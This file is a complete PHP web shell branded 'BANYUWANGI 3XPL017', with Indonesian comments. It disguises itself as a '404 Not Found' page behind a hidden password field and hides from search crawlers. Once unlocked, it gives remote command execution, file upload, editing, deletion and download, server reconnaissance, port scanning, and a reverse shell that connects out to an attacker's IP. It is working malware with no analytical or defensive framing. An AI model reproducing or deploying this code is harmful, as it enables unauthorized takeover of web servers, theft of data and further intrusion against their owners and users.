<?php
header("X-XSS-Protection: 0");
session_start();
ob_start();
set_time_limit(0);
error_reporting(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

if (version_compare(PHP_VERSION, '5.3.0', '<')) {
	@set_magic_quotes_runtime(0);
}
if (!empty($_SERVER['HTTP_USER_AGENT'])) {
	$userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
	if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
		header('HTTP/1.0 404 Not Found');
		exit;
	}
}

$encrypted_password = '60d5288c69fde30a115890dd0df8a3d6'; // Password terenkripsi (md5)

function login_shell()
{
?>
	<!DOCTYPE HTML>
	<html>
	<head>
		<title>404 Not Found</title>
		<style>
			body {
				background-color: #fff;
				margin: 0;
				height: 100vh;
				display: flex;
				justify-content: center;
				align-items: center;
			}
			input {
				margin: 0;
				background-color: #fff;
				border: 1px solid #fff;
				text-align: center;
			}
		</style>
	</head>
	<body>
		<form method="post">
			<input type="password" name="password" autocomplete="off">
		</form>
	</body>
	</html>
	<?php
	exit;
}

if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
	if (isset($_POST['password']) && (md5($_POST['password']) == $encrypted_password)) {
		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
		header('Location: ' . $_SERVER['PHP_SELF']);
		exit;
	} else {
		login_shell();
	}
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>root@localhost</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
    body {
        color: #f1f1f1;
        font-family: 'Poppins', sans-serif;
        background-color: #333;
        background-size: cover;
        background-position: center;
        background-repeat: no-repeat;
        margin: 0;
        padding: 0;
    }
    .content {
        background-color: rgba(46, 46, 46, 0.8);
        padding: 20px;
        border-radius: 10px;
        margin: 20px;
    }
    h1, h3 {
        color: #f70707;
    }
    p, address {
        color: #f1f1f1;
    }
    table {
        width: 100%;
        border-collapse: collapse;
    }
    th, td {
        padding: 10px;
        text-align: left;
        border-bottom: 1px solid #ddd;
    }
    th {
        background-color: #444;
    }
    a {
        color: #1e90ff;
        text-decoration: none;
    }
    a:hover {
        text-decoration: underline;
    }
    form {
        margin: 20px 0;
    }
    input[type="text"], input[type="file"], input[type="password"], input[type="submit"], textarea {
        margin: 5px 0;
        padding: 5px;
        border: 1px solid #555;
        border-radius: 5px;
        background-color: #444;
        color: #f1f1f1;
    }
    input[type="submit"] {
        background-color: #ff6347; /* Dark red */
        border: none;
        cursor: pointer;
    }
    input[type="submit"]:hover {
        background-color: #dc143c; /* Dark red hover */
    }
    .result {
        white-space: pre-wrap;
        background-color: rgba(0, 139, 139, 0.2); /* Dark cyan semi-transparent */
        padding: 10px;
        margin-top: 10px;
        border-radius: 5px;
    }
    .result pre {
        color: #f1f1f1;
        font-family: monospace;
    }
    .header {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 500px;
        img {
            width: 350px;
        }
    }
    /* Informasi Server */
    @keyframes colorChange {
    0% { color: #f70707; }
    50% { color: #ff4d4d; } /* Warna lebih terang dari #f70707 */
    100% { color: #f70707; }
}

.server-info {
    background-color: #1e1e1e;
    color: #00ff00;
    font-family: 'Courier New', Courier, monospace;
    padding: 20px;
    border-radius: 10px;
    border: 1px solid #00ff00;
    display: flex;
}

.server-info ul {
    list-style-type: none;
    padding: 0;
}

.server-info li {
    margin: 5px 0;
}

.server-info span {
    color: #f70707;
    font-weight: bold;
    animation: colorChange 2s infinite;
}
.more-content {
    display: none;
}
.show-more {
    color: blue;
    cursor: pointer;
}

.pagination {
    margin-top: 20px;
    text-align: center;
}

.page-link {
    color: #1e90ff;
    text-decoration: none;
    margin: 0 5px;
    padding: 5px 10px;
    border: 1px solid #1e90ff;
    border-radius: 5px;
}

.page-link:hover {
    background-color: #1e90ff;
    color: #fff;
}

.current-page {
    font-weight: bold;
    color: #fff;
    background-color: #1e90ff;
    padding: 5px 10px;
    border-radius: 5px;
    margin: 0 5px;
}
</style>
<script>
        function toggleContent(id) {
            var content = document.getElementById(id);
            var link = document.getElementById(id + '-link');
            if (content.style.display === 'none') {
                content.style.display = 'inline';
                link.innerHTML = ' Show less';
            } else {
                content.style.display = 'none';
                link.innerHTML = ' Show more';
            }
        }
    </script>
</head>
<body>
<div class="content">
<?php
// Fungsi untuk menghapus file
function delete_file($file) {
    if (file_exists($file)) {
        unlink($file);
        echo 'File berhasil dihapus: ' . htmlspecialchars($file) . '<br>';
    } else {
        echo 'File tidak ditemukan: ' . htmlspecialchars($file) . '<br>';
    }
}

// Fungsi untuk membuat folder
function create_folder($folder_name) {
    if (!file_exists($folder_name)) {
        mkdir($folder_name);
        echo 'Folder berhasil dibuat: ' . htmlspecialchars($folder_name) . '<br>';
    } else {
        echo 'Folder sudah ada: ' . htmlspecialchars($folder_name) . '<br>';
    }
}

// Fungsi untuk mendapatkan informasi server
function get_server_info($current_dir) {
    $info = array();
    $info['server_ip'] = $_SERVER['SERVER_ADDR'] ?? 'Tidak diketahui';
    $info['client_ip'] = $_SERVER['REMOTE_ADDR'] ?? 'Tidak diketahui';
    $info['uname'] = php_uname();
    $info['disabled_functions'] = ini_get('disable_functions');
    $info['open_basedir'] = ini_get('open_basedir');
    
    // Informasi penyimpanan HDD/SSD
    $info['disk_total_space'] = disk_total_space("/") . ' bytes';
    $info['disk_free_space'] = disk_free_space("/") . ' bytes';

    // Informasi RAM
    if (function_exists('memory_get_usage')) {
        $info['memory_usage'] = memory_get_usage() . ' bytes';
    } else {
        $info['memory_usage'] = 'Tidak diketahui';
    }
    
    // Informasi perangkat lunak
    $info['php_version'] = phpversion();
    $info['server_software'] = $_SERVER['SERVER_SOFTWARE'] ?? 'Tidak diketahui';

    $info['pwd'] = realpath($current_dir); // Menggunakan realpath untuk mendapatkan path absolut

    return $info;
}

function open_directory($dir) {
    if (is_dir($dir)) {
        if ($dh = opendir($dir)) {
            // Simpan path awal ke dalam sesi jika belum disimpan
            if (!isset($_SESSION['initial_path'])) {
                $_SESSION['initial_path'] = $dir;
            }

            // Ambil semua file dalam direktori
            $files = [];
            while (($file = readdir($dh)) !== false) {
                $files[] = $file;
            }
            closedir($dh);

            // Tentukan jumlah file per halaman
            $files_per_page = 20;
            $total_files = count($files);
            $total_pages = ceil($total_files / $files_per_page);

            // Ambil halaman saat ini dari parameter GET, default ke halaman 1
            $current_page = isset($_GET['page']) ? (int)$_GET['page'] : 1;
            if ($current_page < 1) $current_page = 1;
            if ($current_page > $total_pages) $current_page = $total_pages;

            // Tentukan offset untuk halaman saat ini
            $offset = ($current_page - 1) * $files_per_page;

            // Ambil subset file untuk halaman saat ini
            $files = array_slice($files, $offset, $files_per_page);

            echo '<form method="post" id="file-actions-form">';
            echo '<table>';
            echo '<tr><th>Select</th><th>Name</th><th>Size</th><th>Modifict</th><th>Owner/Group</th><th>Permissions</th><th>Action</th><th>Download</th></tr>';
            
            foreach ($files as $file) {
                $file_path = $dir . '/' . $file;
                $file_size = is_file($file_path) ? filesize($file_path) . ' bytes' : '—';
                $file_mod_time = date("F d Y H:i:s.", filemtime($file_path));
                
                // Periksa apakah fungsi POSIX tersedia
                if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
                    $file_owner = posix_getpwuid(fileowner($file_path))['name'];
                    $file_group = posix_getgrgid(filegroup($file_path))['name'];
                } else {
                    $file_owner = 'N/A';
                    $file_group = 'N/A';
                }
                
                $file_perms = substr(sprintf('%o', fileperms($file_path)), -4);
                echo '<tr>';
                echo '<td><input type="radio" name="selected_file" value="' . htmlspecialchars($file_path) . '"></td>';
                echo '<td><a href="?path=' . urlencode($dir . '/' . $file) . '">' . htmlspecialchars($file) . '</a></td>';
                echo '<td>' . htmlspecialchars($file_size) . '</td>';
                echo '<td>' . htmlspecialchars($file_mod_time) . '</td>';
                echo '<td>' . htmlspecialchars($file_owner . '/' . $file_group) . '</td>';
                echo '<td>' . htmlspecialchars($file_perms) . '</td>';
                echo '<td><a href="?path=' . urlencode($dir) . '&delete=' . urlencode($file) . '" onclick="return confirm(\'Apakah Anda yakin ingin menghapus file ini?\')">Hapus</a></td>';
                echo '<td><a href="?action=download&file=' . urlencode($file_path) . '">Download</a></td>';
                echo '</tr>';
            }
            echo '</table>';
            echo '<select name="file_action">';
            echo '<option value="view">View</option>';
            echo '<option value="edit">Edit</option>';
            echo '<option value="rename">Rename</option>';
            echo '</select>';
            echo '<input type="submit" value="Execute">';
            echo '</form>';

            // Tampilkan navigasi halaman
            echo '<div class="pagination">';
            for ($page = 1; $page <= $total_pages; $page++) {
                if ($page == $current_page) {
                    echo '<strong class="current-page">' . $page . '</strong> ';
                } else {
                    echo '<a class="page-link" href="?path=' . urlencode($dir) . '&page=' . $page . '">' . $page . '</a> ';
                }
            }
            echo '</div>';
        } else {
            echo 'Tidak dapat membuka direktori: ' . htmlspecialchars($dir);
        }
    } else {
        echo htmlspecialchars($dir) . ' bukan direktori.';
    }
}

// Fungsi untuk menjalankan perintah CLI
function run_cli_command($command) {
    return shell_exec($command);
}

// Fungsi untuk memindai port
function scan_ports($host, $start_port, $end_port) {
    $open_ports = [];
    for ($port = $start_port; $port <= $end_port; $port++) {
        $connection = @fsockopen($host, $port, $errno, $errstr, 0.5);
        if (is_resource($connection)) {
            $open_ports[] = $port;
            fclose($connection);
        }
    }
    return $open_ports;
}

// Fungsi untuk mencari file
function search_files($dir, $regex) {
    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
    $results = [];
    foreach ($iterator as $file) {
        if (preg_match($regex, $file->getFilename())) {
            $results[] = $file->getPathname();
        }
    }
    return $results;
}

function edit_file($file_path, $new_content) {
    if (file_exists($file_path)) {
        file_put_contents($file_path, $new_content);
        echo 'File berhasil diedit: ' . htmlspecialchars($file_path) . '<br>';
    } else {
        echo 'File tidak ditemukan: ' . htmlspecialchars($file_path) . '<br>';
    }
}

function view_file($file_path) {
    if (file_exists($file_path)) {
        return file_get_contents($file_path);
    } else {
        return 'File tidak ditemukan: ' . htmlspecialchars($file_path) . '<br>';
    }
}

function rename_file($old_name, $new_name) {
    if (file_exists($old_name)) {
        rename($old_name, $new_name);
        echo 'File berhasil diubah nama: ' . htmlspecialchars($old_name) . ' menjadi ' . htmlspecialchars($new_name) . '<br>';
    } else {
        echo 'File tidak ditemukan: ' . htmlspecialchars($old_name) . '<br>';
    }
}

// Fungsi untuk back connect
function back_connect($ip, $port) {
    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) {
        echo "Tidak dapat terhubung ke $ip:$port. Error: $errstr ($errno)<br>";
        return;
    }
    $descriptorspec = array(
        0 => $sock,
        1 => $sock,
        2 => $sock
    );
    $process = proc_open('/bin/sh -i', $descriptorspec, $pipes);
    if (is_resource($process)) {
        while ($status = proc_get_status($process) && $status['running']) {
            usleep(100000);
        }
        proc_close($process);
    }
    fclose($sock);
}

// Proses logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Direktori yang ingin dibuka
$dir = isset($_GET['path']) ? $_GET['path'] : '.';

// Proses penghapusan file
if (isset($_GET['delete'])) {
    delete_file($_GET['path'] . '/' . $_GET['delete']);
}

// Proses pembuatan folder
if (isset($_POST['folder_name'])) {
    create_folder($_POST['folder_name']);
}

// Ambil informasi server
$server_info = get_server_info($dir);

// Proses download file
if (isset($_GET['action']) && $_GET['action'] === 'download' && isset($_GET['file'])) {
    $file_path = $_GET['file'];
    if (file_exists($file_path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_path));
        readfile($file_path);
        exit;
    } else {
        echo 'File tidak ditemukan: ' . htmlspecialchars($file_path) . '<br>';
    }
}

// Proses back connect
if (isset($_POST['back_connect_ip']) && isset($_POST['back_connect_port'])) {
    $ip = $_POST['back_connect_ip'];
    $port = (int) $_POST['back_connect_port'];
    back_connect($ip, $port);
}

?>

<?php if (isset($_SESSION[md5($_SERVER['HTTP_HOST'])]) && $_SESSION[md5($_SERVER['HTTP_HOST'])] === true): ?>
<div class="header">
    <h1>BANYUWANGI 3XPL017</h1>
</div>

<h3>Informasi Server</h3>
<div class="server-info">
    <ul>
        <li><span>Server IP:</span> <?php echo htmlspecialchars($server_info['server_ip']); ?> | <span>Client IP:</span> <?php echo htmlspecialchars($server_info['client_ip']); ?></li>
        <li><span>Hostname:</span> <?php echo htmlspecialchars($server_info['uname']); ?></li>
        <li><span>PHP Version:</span> <?php echo htmlspecialchars($server_info['php_version']); ?></li>
        <li><span>Server Software:</span> <?php echo htmlspecialchars($server_info['server_software']); ?></li>
        <li><span>Disk Total Space:</span> <?php echo htmlspecialchars($server_info['disk_total_space']); ?> | <span>Disk Free Space:</span> <?php echo htmlspecialchars($server_info['disk_free_space']); ?></li>
        <li><span>Memory Usage:</span> <?php echo htmlspecialchars($server_info['memory_usage']); ?></li>
        <li><span>Disabled Functions:</span>
            <?php
            $disabled_functions = htmlspecialchars($server_info['disabled_functions']);
            if (strlen($disabled_functions) > 50) { // Ubah panjang sesuai kebutuhan
                echo substr($disabled_functions, 0, 50);
                echo '<span id="more-content" class="more-content">' . substr($disabled_functions, 50) . '</span>';
                echo '<span id="more-content-link" class="show-more" onclick="toggleContent(\'more-content\')"> Show more</span>';
            } else {
                echo $disabled_functions;
            }
            ?>
        </li>        
        <li><span>Open Basedir:</span> <?php echo htmlspecialchars($server_info['open_basedir']); ?></li>
        <li>
    <span>PWD:</span>
    <?php
    // Mendapatkan path saat ini dari server_info
    $current_path = $server_info['pwd'];

    // Memecah path menjadi bagian-bagian
    $path_parts = explode(DIRECTORY_SEPARATOR, $current_path);

    // Inisialisasi path sementara
    $temp_path = '';

    // Menampilkan navigasi
    foreach ($path_parts as $index => $part) {
        if (!empty($part)) {
            // Membuat path sementara yang bertambah setiap kali loop
            $temp_path .= DIRECTORY_SEPARATOR . $part;

            // Membuat link untuk setiap bagian path
            echo '<a href="?path=' . urlencode($temp_path) . '">' . htmlspecialchars($part) . '</a>';

            // Menambahkan pemisah path kecuali untuk bagian terakhir
            if ($index < count($path_parts) - 1) {
                echo DIRECTORY_SEPARATOR;
            }
        }
    }

    // Menambahkan link untuk kembali ke home directory
    echo ' <a href="?path=' . urlencode($_SESSION['initial_path']) . '">[Home]</a>';
    ?>
</li>

    </ul>

</div>

<form method="post" enctype="multipart/form-data">
    <label>Unggah File:</label>
    <input type="file" name="file">
    <input type="submit" value="Unggah">
</form>

<form method="post">
    <label>Nama Folder Baru:</label>
    <input type="text" name="folder_name">
    <input type="submit" value="Buat Folder">
</form>

<form method="get">
    <label>Jalankan Perintah CLI:</label>
    <input type="text" name="command">
    <input type="submit" value="Jalankan">
</form>

<form method="get">
    <label>Pindai Port:</label>
    <input type="text" name="host" placeholder="Host">
    <input type="text" name="start_port" placeholder="Port Awal">
    <input type="text" name="end_port" placeholder="Port Akhir">
    <input type="submit" value="Pindai">
</form>

<form method="get">
    <label>Cari File (Regex):</label>
    <input type="text" name="search_dir" placeholder="Direktori">
    <input type="text" name="regex" placeholder="Regex">
    <input type="submit" value="Cari">
</form>

<form method="post">
    <label>Back Connect IP:</label>
    <input type="text" name="back_connect_ip" placeholder="IP Address">
    <label>Back Connect Port:</label>
    <input type="text" name="back_connect_port" placeholder="Port">
    <input type="submit" value="Connect">
</form>

<?php
// Proses pengunggahan file
if (isset($_FILES['file'])) {
    $target_file = $dir . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
        echo 'File ' . htmlspecialchars(basename($_FILES['file']['name'])) . ' berhasil diunggah.<br>';
    } else {
        echo 'Terjadi kesalahan saat mengunggah file.<br>';
    }
}

// Proses menjalankan perintah CLI
if (isset($_GET['command'])) {
    $command_output = run_cli_command($_GET['command']);
    echo '<div class="result"><h3>Hasil Perintah:</h3><pre>' . htmlspecialchars($command_output) . '</pre></div>';
}

// Proses pemindaian port
if (isset($_GET['host']) && isset($_GET['start_port']) && isset($_GET['end_port'])) {
    $host = $_GET['host'];
    $start_port = (int) $_GET['start_port'];
    $end_port = (int) $_GET['end_port'];
    $open_ports = scan_ports($host, $start_port, $end_port);
    echo '<div class="result"><h3>Port Terbuka di ' . htmlspecialchars($host) . ':</h3>';
    if (!empty($open_ports)) {
        echo '<ul>';
        foreach ($open_ports as $port) {
            echo '<li>Port ' . htmlspecialchars($port) . ' terbuka</li>';
        }
        echo '</ul>';
    } else {
        echo '<p>Tidak ada port terbuka yang ditemukan.</p>';
    }
    echo '</div>';
}

// Proses pencarian file
if (isset($_GET['search_dir']) && isset($_GET['regex'])) {
    $search_dir = $_GET['search_dir'];
    $regex = $_GET['regex'];
    $search_results = search_files($search_dir, $regex);
    echo '<div class="result"><h3>Hasil Pencarian:</h3>';
    if (!empty($search_results)) {
        echo '<ul>';
        foreach ($search_results as $result) {
            echo '<li>' . htmlspecialchars($result) . '</li>';
        }
        echo '</ul>';
    } else {
        echo '<p>Tidak ada file yang cocok ditemukan.</p>';
    }
    echo '</div>';
}

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['selected_file']) && isset($_POST['file_action'])) {
    $selected_file = $_POST['selected_file'];
    $file_action = $_POST['file_action'];

    if ($file_action == 'view') {
        $file_content = view_file($selected_file);
        echo '<div class="result"><h3>Isi File:</h3><pre>' . htmlspecialchars($file_content) . '</pre></div>';
    } elseif ($file_action == 'edit' && isset($_POST['new_content'])) {
        edit_file($selected_file, $_POST['new_content']);
    } elseif ($file_action == 'rename' && isset($_POST['new_name'])) {
        rename_file($selected_file, $_POST['new_name']);
    }
}

if ($file_action == 'edit') {
    echo '<form method="post">';
    echo '<input type="hidden" name="selected_file" value="' . htmlspecialchars($selected_file) . '">';
    echo '<input type="hidden" name="file_action" value="edit">';
    echo '<textarea name="new_content" rows="20" cols="80">' . htmlspecialchars(view_file($selected_file)) . '</textarea>';
    echo '<input type="submit" value="Save">';
    echo '</form>';
} elseif ($file_action == 'rename') {
    echo '<form method="post">';
    echo '<input type="hidden" name="selected_file" value="' . htmlspecialchars($selected_file) . '">';
    echo '<input type="hidden" name="file_action" value="rename">';
    echo '<input type="text" name="new_name" placeholder="New file name">';
    echo '<input type="submit" value="Rename">';
    echo '</form>';
}

// Proses membuka direktori
open_directory($dir);
?>

<?php else: ?>
<style>
    body {
        background-color: #fff;
        margin: 0;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
    }
    .login-form {
        display: none;
    }
</style>
<div class="login-form">
    <form method="post">
        <input type="password" name="password">
        <input type="submit" value="Login">
    </form>
    <?php
    if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['password'])) {
        if (md5($_POST['password']) === $encrypted_password) {
            $_SESSION['logged_in'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            echo '<p>Password salah. Silakan coba lagi.</p>';
        }
    }
    ?>
</div>
<?php endif; ?>
</div>
</body>
</html>